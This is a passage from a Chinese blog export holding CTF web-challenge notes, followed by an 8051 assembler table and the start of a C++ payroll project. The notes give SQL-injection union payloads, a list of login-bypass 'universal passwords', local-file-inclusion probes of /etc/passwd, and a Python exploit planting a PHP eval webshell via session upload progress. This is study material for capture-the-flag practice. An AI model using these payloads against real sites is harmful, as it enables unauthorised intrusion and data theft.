<p><a href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEwww.zip%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%BE%97%E5%88%B0%E5%8E%8B%E7%BC%A9%E5%8C%85www.zip%EF%BC%8C%E8%A7%A3%E5%8E%8B%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%EF%BC%8C%E5%A6%82%E5%9B%BE%EF%BC%9A">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip直接访问www.zip下载，得到压缩包www.zip，解压打开文件，如图：</a></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_2.png" alt="CTFHUB_WEB_3_2"></p>
<p>打开flag文件，发现没有flag</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_3.png" alt="CTFHUB_WEB_3_3"></p>
<p>直接用</p>
<p><a href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt%E5%BE%97%E5%88%B0flag">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt得到flag</a></p>
<h2 id="Web-弱口令"><a href="#Web-弱口令" class="headerlink" title="Web_弱口令"></a>Web_弱口令</h2><blockquote>
<p><strong>弱口令</strong></p>
<p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。 </p>
</blockquote>
<p>使用<code>BurpSuite</code>中<code>Intruder</code>模块 ，即暴力破解模块(或在fuzz中使用)</p>
<p>开启burp代理</p>
<p>登录信息随便填，抓到request请求如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Origin: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name=admin&amp;password=ctfhub&amp;referer=</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_2.png" alt="CTFHUB_WEB_4_2"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_3.png" alt="CTFHUB_WEB_4_3"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_4.png" alt="CTFHUB_WEB_4_4"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_5.png" alt="CTFHUB_WEB_4_5"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>CTF</tag>
        <tag>ctf.show</tag>
      </tags>
  </entry>
  <entry>
    <title>webctf</title>
    <url>/2024/03/13/webctf/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h1 id="CTF-WEB"><a href="#CTF-WEB" class="headerlink" title="CTF_WEB"></a>CTF_WEB</h1><h2 id="SQL注入：联合注入"><a href="#SQL注入：联合注入" class="headerlink" title="SQL注入：联合注入"></a>SQL注入：联合注入</h2><p>1、数据库为mysql的爆库、爆表、爆字段、爆值的语句：</p>
<p><strong>爆库：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,database();#查看此处有多字段</span><br></pre></td></tr></table></figure>

<p><strong>爆表：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database(); #   </span><br></pre></td></tr></table></figure>

<p><strong>爆字段：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&quot;表名&quot;; # </span><br></pre></td></tr></table></figure>

<p><strong>爆值：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,字段 from 表名; #   </span><br></pre></td></tr></table></figure>

<p>例子：</p>
<blockquote>
<p>常规套路：</p>
<p>1、查字段</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>order<span class="comment">/**/</span>by<span class="comment">/**/</span><span class="number">3</span>#admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure>

<p>2、查库(web2)</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="title function_ invoke__">database</span>(),<span class="number">3</span>#</span><br></pre></td></tr></table></figure>

<p>3、查表（flag,user）</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name),<span class="number">3</span><span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="symbol">&#x27;web2</span>&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name),<span class="number">3</span><span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="title function_ invoke__">database</span>()#(模板)</span><br></pre></td></tr></table></figure>

<p>4、查字段flag</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(column_name),<span class="number">3</span><span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name=<span class="symbol">&#x27;flag</span>&#x27;#</span><br></pre></td></tr></table></figure>

<p>5、查字段flag内容</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,flag,<span class="number">3</span><span class="comment">/**/</span>from<span class="comment">/**/</span>flag#</span><br></pre></td></tr></table></figure>


</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_1.png">*</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_2.png" alt="ctfshow_web6_2"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_3.png" alt="ctfshow_web6_3"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_4.png" alt="ctfshow_web6_4"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_5.png" alt="ctfshow_web6_5"></p>
<p>注意查找字段图中红色字体错误了，应该为information_schema.columns&#x2F;**&#x2F;,图中column少了s</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_6.png" alt="ctfshow_web6_6"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_7.png" alt="ctfshow_web6_7"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_8.png" alt="ctfshow_web6_8"></p>
<h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h2><p>实战例子：</p>
<p>CTFshow&#x2F; easy_include</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-z]+/&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码解释：</p>
<blockquote>
<p>观察cookie，发现自动开启了session，直接session文件包含</p>
<p>如果能获取PHPSESSID<br>    “请求 Cookie”: {<br>        <strong>“PHPSESSID”: “a5c4fd8ef729d435160c08a37d20ed7a”</strong><br>    }</p>
</blockquote>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># Author:ctfshow-h1xa</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;localhost/tmp/sess_ctfshow&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>:<span class="string">&#x27;system(&quot;cat /flag_is_here.txt&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data,files=file,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>



<h1 id="php文件漏洞"><a href="#php文件漏洞" class="headerlink" title="php文件漏洞"></a>php文件漏洞</h1><p><strong>get方式查看文件漏洞</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=/etc/passwd  </span><br><span class="line">#GET /?url=/etc/passwd HTTP/1.1</span><br><span class="line">#若出现大串文件，则有文件漏洞</span><br><span class="line">#($_GET[&#x27;url&#x27;])极有可能含有文件漏洞</span><br></pre></td></tr></table></figure>

<p><strong>使用php协议</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=php://input</span><br><span class="line">#GET /?url=php://input HTTP/1.1</span><br><span class="line">#可以访问请求的原始数据的只读流;</span><br><span class="line">#enctype=&quot;multipart/form-data&quot;的时候php://input是无效的;</span><br><span class="line"></span><br><span class="line">?url=php://output</span><br><span class="line">#GET /?url=php://output HTTP/1.1</span><br><span class="line">#一个只写的数据流，允许以print和echo一样的方式写入到输出缓冲区</span><br><span class="line"></span><br><span class="line">?url=php://fd</span><br><span class="line">#GET /?url=php://fd HTTP/1.1</span><br><span class="line">#允许直接访问指定的文件描述符。例如：php://fd/3引用了文件描述符3.</span><br></pre></td></tr></table></figure>

<p><strong>查看PHP下的文夹使用ls</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>查看php下的文件夹中的文件内容cat</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat 文件夹名称&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>查看文件日志的文件夹</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>



<h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><blockquote>
<p> ‘r 1&#x3D;1 #</p>
<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p> 账号： admin<br> 密码：admin</p>
<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p> 账号：admin<br> 密码：admin888</p>
<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p> 账号：admin</p>
<p> 密码：域名名</p>
<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<h2 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h2><p> “or ‘a’&#x3D;”a<br> ‘’)or(‘a’&#x3D;’a<br> or 1&#x3D;1–<br> ‘or 1&#x3D;1–<br> a’or’ 1&#x3D;1–<br> “or 1&#x3D;1–<br> ‘or’a’&#x3D;’a<br> “or”&#x3D;”a’&#x3D;’a<br> ‘or”&#x3D;’<br> ‘or’&#x3D;’or’</p>
<p> admin’or 1&#x3D;1#<br> ‘&#x3D;’&amp;password&#x3D;’&#x3D;’<br> admin’ or 1&#x3D;1#<br> admin’&#x2F;<strong>&#x2F;or&#x2F;</strong>&#x2F;1&#x3D;1#<br> admin’&#x2F;*<br> *&#x2F;‘</p>
<p> 1 or ‘1’&#x3D;’1’&#x3D;1<br> 1 or ‘1’&#x3D;’1’ or 1&#x3D;1<br> ‘OR 1&#x3D;1%00<br> “or 1&#x3D;1%00<br> ‘xor## PHP万能密码</p>
<p> ‘or’&#x3D;’or’</p>
<p> ‘or 1&#x3D;1&#x2F;* 字符型 GPC是否开都可以使用</p>
<p> User: something<br> Pass: ‘OR ‘1’&#x3D;’1</p>
<p> jsp 万能密码</p>
<p> 1’or’1’&#x3D;’1</p>
<p> admin’ OR 1&#x3D;1&#x2F;*</p>
<p> 用户名：admin 系统存在这个用户的时候 才用得上<br> 密码：1’or’1’&#x3D;’1</p>
</blockquote>
<h1 id="万能账号"><a href="#万能账号" class="headerlink" title="万能账号"></a>万能账号</h1><blockquote>
<p>a’ or true #</p>
<p>账号：…admin’ or ‘a’&#x3D;’a 密码随便填</p>
</blockquote>
<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><blockquote>
<hr>
<p>&#x2F;or|-||&#x2F;|*|&lt;|&gt;|!|x|hex|(|)|+|select&#x2F;i</p>
<blockquote>
<ol>
<li><code>/</code>：这个符号表示正则表达式模式的开始和结束。</li>
<li><code>|</code>：这个符号代表“或”条件，意味着可以匹配两边的任何模式。</li>
<li>\-, \, /, \*, &lt;, &gt;, !, x, hex, (, ), +, select&#96;: 这些是正则表达式将尝试匹配的实际模式。这些模式中的一些代表特定字符，而其他一些代表某些条件。<ul>
<li><code>-</code>：匹配破折号字符。</li>
<li><code>\\</code>：匹配反斜杠字符。</li>
<li><code>\/</code>：匹配正斜杠字符。</li>
<li><code>\\*</code>：匹配星号字符。</li>
<li><code>\&lt;</code>：匹配单词的开头。</li>
<li><code>\&gt;</code>：匹配单词的结尾。</li>
<li><code>\!</code>：匹配感叹号字符。</li>
<li><code>x</code>：匹配字母 ‘x’。</li>
<li><code>hex</code>：匹配字符串 ‘hex’。</li>
<li><code>\(</code>：匹配左括号。</li>
<li><code>\)</code>：匹配右括号。</li>
<li><code>\+</code>：匹配加号。</li>
<li><code>select</code>：匹配字符串 ‘select’。</li>
</ul>
</li>
</ol>
</blockquote>
<p>可以使用管道符||绕过和使用取反符号~~绕过</p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title>单片机原理及应用</title>
    <url>/2024/10/12/%E5%8D%95%E7%89%87%E6%9C%BA%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="常见伪指令"><a href="#常见伪指令" class="headerlink" title="常见伪指令"></a>常见伪指令</h2><table>
<thead>
<tr>
<th align="center">指令</th>
<th>指令作用</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ORG m</td>
<td>定位伪指令</td>
<td>m为双字节数据据，m指出该伪指令后指令的汇编地址，也生成机器指令的其实存储地址。</td>
</tr>
<tr>
<td align="center">符号名 EQU d</td>
<td>数据赋值伪指令</td>
<td>d为单字节或双字节数据或地址。该伪指令把数据和地址d赋值给前面的符号名。</td>
</tr>
<tr>
<td align="center">符号名 EQU r</td>
<td>寄存器名赋值伪指令</td>
<td>r为寄存器名，可以是累加器A或工作寄存器R0~R7。把指定的寄存器名赋值给前面的符号名。</td>
</tr>
<tr>
<td align="center">符号名 BIT n</td>
<td>位地址赋值伪指令</td>
<td>n可为寻址位的单字节地址。地址值可以是十进制或十六进制数。该伪指令把后指定位置地址赋给前面的符号名。</td>
</tr>
<tr>
<td align="center">[标号:]DB X1,X2,…Xn或   [标号:]DB ‘字符串’</td>
<td>定义字节伪指令</td>
<td>Xi为单字节数据。两个单引号括起来的一个字符串。该伪指令以给定字节值初始化一个代码空间区域，把DB后面的X1,X2…Xn或字符串的ASCII码依次存放在程序存储器的一个连续存储单元区间。</td>
</tr>
<tr>
<td align="center">[标号:]DW Y1,Y2…Yn,Yi为双字节数据</td>
<td>定义字伪指令</td>
<td>该伪指令以给定字节值初始化一个代码空间区域，把DW后面的Y1,Y2…Yn依次存放在程序存储器的一个连续存储单元区间。</td>
</tr>
<tr>
<td align="center">END</td>
<td>汇编结束伪指令</td>
<td>控制汇编过程结束。</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>单片机原理及应用</tag>
      </tags>
  </entry>
  <entry>
    <title>C++小型公司工资管理系统</title>
    <url>/2024/01/17/%E5%B0%8F%E5%9E%8B%E5%85%AC%E5%8F%B8%E5%B7%A5%E8%B5%84%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fcpp/</url>
    <content><![CDATA[<h2 id="课题要求"><a href="#课题要求" class="headerlink" title="课题要求"></a>课题要求</h2><p><em><strong>“小型公司工资管理系统设计”</strong></em></p>
<p><strong>1</strong>、<strong>问题描述</strong></p>
<p><strong>某公司需要存储雇员的编号、姓名、性别、所在部门，级别，并进行工资的计算。其中，雇员分为经理、技术人员、销售人员和销售经理。四类人员的月薪计算方法如下：经理拿固定月薪；技术人员按小时领取月薪；销售人员按其当月销售额的提成领取工资；销售经理既拿固定月薪也领取销售提成。</strong></p>
<p><strong>设计一程序能够对公司人员进行管理，应用到继承、抽象类、虚函数、虚基类、多态和文件的输入&#x2F;输出等内容。</strong></p>
<p><strong>2</strong>、<strong>功能要求</strong></p>
<p><strong>（1）添加功能：程序能够任意添加上述四类人员的记录，可提供选择界面供用户选择所要添加的人员类别，要求员工的编号要唯一，如果添加了重复编号的记录时，则提示数据添加重复并取消添加。</strong></p>
<p><strong>（2）查询功能：可根据编号、姓名等信息对已添加的记录进行查询，如果未找到，给出相应的提示信息，如果找到，则显示相应的记录信息；</strong></p>
<p><strong>（3）显示功能：可显示当前系统中所有记录，每条记录占据一行。</strong></p>
<p><strong>（4）编辑功能：可根据查询结果对相应的记录进行修改，修改时注意编号的唯一性。</strong></p>
<p><strong>（5）删除功能：主要实现对已添加的人员记录进行删除。如果当前系统中没有相应的人员记录，则提示“记录为空！”并返回操作；否则，输入要删除的人员的编号或姓名，根据所输入的信息删除该人员记录，如果没有找到该人员信息，则提示相应的记录不存。</strong></p>
<p><strong>（6）统计功能：能根据多种参数进行人员的统计。例如，统计四类人员数量以及总数，</strong></p>
<p><strong>或者统计男、女员工的数量，或者统计平均工资、最高工资、最低工资等信息。</strong></p>
<p><strong>（7）保存功能：可将当前系统中各类人员记录存入文件中，存入方式任意。</strong></p>
<p><strong>（8）读取功能：可将保存在文件中的人员信息读入到当前系统中，供用户进行使用。</strong></p>
<p><strong>3</strong>、<strong>问题的解决方案</strong></p>
<p><strong>根据系统功能要求，可以将问题解决分为以下步骤：</strong></p>
<p><strong>（1）应用系统分析，建立该系统的功能模块框图以及界面的组织和设计；</strong></p>
<p><strong>（2）分析系统中的各个实体及它们之间的关系；</strong></p>
<p><strong>（3）根据问题描述，设计系统的类层次；</strong></p>
<p><strong>（4）完成类层次中各个类的描述；</strong></p>
<p><strong>（5）完成类中各个成员函数的定义；</strong></p>
<p><strong>（6）完成系统的应用模块；</strong></p>
<p><strong>（7）功能调试；</strong></p>
<p><strong>（8）完成系统总结报告。</strong></p>
<h2 id="main-cpp"><a href="#main-cpp" class="headerlink" title="main.cpp"></a>main.cpp</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;employee.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">init_list</span>();</span><br><span class="line">	<span class="built_in">load</span>();</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">	<span class="built_in">menu</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="employee-h"><a href="#employee-h" class="headerlink" title="employee.h"></a>employee.h</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Employee_base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Employee_base</span>();</span><br><span class="line">	<span class="built_in">Employee_base</span>(<span class="type">int</span> i, string n, string g, string d, string l, <span class="type">double</span> s,string t) :<span class="built_in">id</span>(i), <span class="built_in">name</span>(n), <span class="built_in">gender</span>(g), <span class="built_in">department</span>(d), <span class="built_in">level</span>(l), <span class="built_in">Salary</span>(s),<span class="built_in">type</span>(t) &#123;&#125;;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span> <span class="type">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">getId</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">getname</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">getgender</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">getdepartment</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">getlevel</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">getsalary</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">gettype</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> id;<span class="comment">//编号</span></span><br><span class="line">	string name;<span class="comment">//姓名</span></span><br><span class="line">	string gender;<span class="comment">//性别</span></span><br><span class="line">	string department;<span class="comment">//部门</span></span><br><span class="line">	string level;<span class="comment">//级别</span></span><br><span class="line">	<span class="type">double</span> Salary;</span><br><span class="line">	string type;<span class="comment">//类型</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Manager</span>:<span class="keyword">virtual</span> <span class="keyword">public</span> Employee_base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Manager</span>();</span><br><span class="line">	<span class="built_in">Manager</span>(<span class="type">int</span> i, string n, string g, string d, string l, <span class="type">double</span> s,<span class="type">double</span> m,string t) :<span class="built_in">Employee_base</span>(i,n,g,d,l,s,t),<span class="built_in">MonthSalary</span>(m)&#123;&#125;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">addmanager</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">double</span> MonthSalary;<span class="comment">//月薪</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Salesperson</span> :<span class="keyword">virtual</span> <span class="keyword">public</span> Employee_base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Salesperson</span>();</span><br><span class="line">	<span class="built_in">Salesperson</span>(<span class="type">int</span> i, string n, string g, string d, string l, <span class="type">double</span> s,<span class="type">double</span> sa,<span class="type">double</span> c,string t) :<span class="built_in">Employee_base</span>(i, n, g, d, l, s,t) ,<span class="built_in">SalesAmount</span>(sa),<span class="built_in">commision</span>(c)&#123;&#125;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span><span class="type">const</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">addsalesperson</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">double</span> SalesAmount;<span class="comment">//销售额</span></span><br><span class="line">	<span class="type">double</span> commision;<span class="comment">//提成率</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SalesManager</span> :<span class="keyword">virtual</span> <span class="keyword">public</span> Employee_base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">SalesManager</span>();</span><br><span class="line">	<span class="built_in">SalesManager</span>(<span class="type">int</span> i, string n, string g, string d, string l, <span class="type">double</span> s,<span class="type">double</span> m,<span class="type">double</span> sa,<span class="type">double</span> c,string t) :<span class="built_in">Employee_base</span>(i, n, g, d, l, s,t),<span class="built_in">MonthSalary</span>(m),<span class="built_in">SalesAmount</span>(sa),<span class="built_in">commision</span>(c) &#123;&#125;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span><span class="type">const</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">addsalesmanager</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">double</span> MonthSalary;</span><br><span class="line">	<span class="type">double</span> SalesAmount;</span><br><span class="line">	<span class="type">double</span> commision;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Technician</span> :<span class="keyword">virtual</span> <span class="keyword">public</span> 